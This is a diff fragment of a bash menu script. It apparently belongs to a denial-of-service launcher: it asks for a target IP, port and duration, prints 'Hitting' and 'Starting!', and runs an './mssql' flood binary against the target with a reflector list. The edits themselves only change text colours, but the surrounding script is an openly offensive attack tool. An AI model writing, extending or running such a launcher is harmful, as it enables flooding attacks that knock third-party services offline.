+echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
 read time 
 clear 
 echo -e "" 
-echo -e "${WHITE} Hitting:${PINK}$ip" 
+echo -e "${BOLDWHITE} Hitting:${PINK}$ip" 
 echo -e " " 
-echo -e "${WHITE} On Port:${PINK}$port " 
+echo -e "${BOLDWHITE} On Port:${PINK}$port " 
 echo -e " " 
-echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
+echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
 echo -e "" 
-echo -e "${WHITE} Starting!" 
+echo -e "${BOLDWHITE} Starting!" 
 echo -e "" 
 ./mssql $ip $port mssql.txt 1 -1 $time 
 read 
@@ -397,7 +398,7 @@ fi
 if [[ $answer == GEO ]] 
 then 
 clear 
-echo -e "${WHITE} Enter IP:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Enter IP:${BRIGHTGREEN} \c" 
 read ip 
 echo -e "" 
 echo -e "To go back to the menu, press enter" 
